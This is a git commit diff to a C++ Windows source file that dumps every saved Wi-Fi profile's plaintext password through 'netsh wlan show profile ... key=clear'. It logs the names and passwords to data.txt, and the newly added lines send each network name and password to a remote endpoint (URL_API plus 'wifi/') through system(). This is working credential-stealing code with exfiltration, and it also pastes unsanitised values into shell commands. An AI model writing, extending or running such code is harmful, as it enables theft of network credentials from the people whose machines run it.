13997a7d67d692ad5b3ca96804c42405910309c6
Philo <phibrujean@gmail.com>
2026-02-24 20:28:47 +0100

    v1

--- fonction.cpp
+++ fonction.cpp
@@ -1,21 +1,23 @@
 #include <iostream>
 #include <string>
 #include <cstdlib>
-#include <cstdlib>
 #include <fstream>
 #include <windows.h>
 #include <regex>
 #include <chrono>
 #include <time.h>
 #include <thread>
+#include <stack>
+#include <sstream>
+#include "api.hpp"
 
 using namespace std;
 
-void espace(){
+void espace() {
     cout << "=============================================" << endl;
 }
 
-void extract(){
+void extract() {
     ofstream fichierentrer("data.txt");
     fichierentrer << "======================LOGS======================" << "\n";
     stack<string> pile;
@@ -39,22 +41,55 @@ void extract(){
     this_thread::sleep_for(chrono::seconds(1));
     _pclose(pipe);
     espace();
+    string mdp;
+    string command;
     do
-    { 
-    FILE* pipe2;
-    char buffer2[256];
-    string cmd = ("netsh wlan show profile name=\"" + pile.top() +
-                            "\" key=clear | findstr \"Contenu\"");
-    // cout << cmd;
-    pipe2 = _popen(cmd.c_str(), "r");
-    fgets(buffer2, 256, pipe2);
-    string liste(buffer2);
-    _pclose(pipe2);
-    // cout << liste;
-    cout << pile.top() << " = " << liste << endl;
-    ofstream fichierentrer("data.txt", ios::app);
-    fichierentrer << pile.top() << " = " << liste << endl;
-    pile.pop();
-    this_thread::sleep_for(chrono::milliseconds(40));
+    {
+        FILE* pipe2;
+        char buffer2[256];
+        string cmd = ("netsh wlan show profile name=\"" + pile.top() +
+            "\" key=clear | findstr \"Contenu\"");
+        // cout << cmd;
+        pipe2 = _popen(cmd.c_str(), "r");
+        fgets(buffer2, 256, pipe2);
+        string liste(buffer2);
+
+        // IA
+        regex rgx2(":\\s*(.+)");
+        smatch match2;
+        if (regex_search(liste, match2, rgx2)) {
+            mdp = match2[1];
+        }
+        else {
+            mdp = liste;
+        }
+        // supprimer \n et espaces en fin de string
+        liste.erase(liste.find_last_not_of(" \n\r\t") + 1);
+        // supprimer espaces en début
+        liste.erase(0, liste.find_first_not_of(" \t"));
+        // IA
+
+        _pclose(pipe2);
+        cout << pile.top() << " = " << liste << endl;
+        ofstream fichierentrer("data.txt", ios::app);
+        fichierentrer << pile.top() << " = " << liste << endl;
+        command = URL_API + "wifi/" + pile.top() + "/" + mdp + "\"";
+        system(command.c_str());
+        pile.pop();
+
+        this_thread::sleep_for(chrono::milliseconds(40));
+
     } while (!pile.empty());
+    
+    
+}
+
+void api() {
+    string command;
+    command = URL_API + "synchro";
+    system(command.c_str());
+}
+
+void api2() {
+
 }
